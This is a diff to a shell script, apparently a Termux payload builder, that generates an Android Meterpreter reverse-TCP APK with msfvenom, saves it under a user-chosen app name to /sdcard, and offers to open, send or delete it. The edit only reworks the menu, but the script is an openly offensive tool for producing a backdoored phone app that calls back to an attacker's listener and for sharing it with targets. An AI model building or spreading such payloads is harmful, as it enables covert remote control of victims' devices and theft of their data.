@@ -71,24 +71,17 @@ echo
 ( msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > /sdcard/$app.apk ) & spin
 trap 5
 echo
-echo -e '\033[0m\033[1m[√] Payload Saved Dir : emulated/0/'
+echo -e "\033[0m\033[1m[√] Payload Saved Dir : emulated/0/${app}.apk"
 echo
-printf '\033[1;92m[?] Are you want to Open/Send this payload ? [O/S/n] '
+echo -e "\e[0m==> Open: [O/o] :: Delete: [D/d] ::Send: [S/s] :: Payload: ${app}.apk"
+echo
+printf '\033[1;92m[?] What do you want to Do with Payload ? '
 read ask
 if [[ $ask = "o" ]] || [[ $ask = "O" ]]
         then cd /sdcard && xdg-open $app.apk
 elif [[ $ask = "s" ]] || [[ $ask = "S" ]]
         then cd /sdcard && xdg-open --send $app.apk
-else echo 'Abort.'
-echo
-exit
-fi
-
-sleep 2
-echo
-printf '\033[1;92m[?] Are you want to delete this payload ? [Y/n] '
-read ask
-if [[ $ask = "y" ]] || [[ $ask = "Y" ]]
+elif [[ $ask = "d" ]] || [[ $ask = "D" ]]
         then cd /sdcard && rm $app.apk
 echo -e '\033[1;92m[\033[0m-\033[1;92m] Deleted.'
 echo
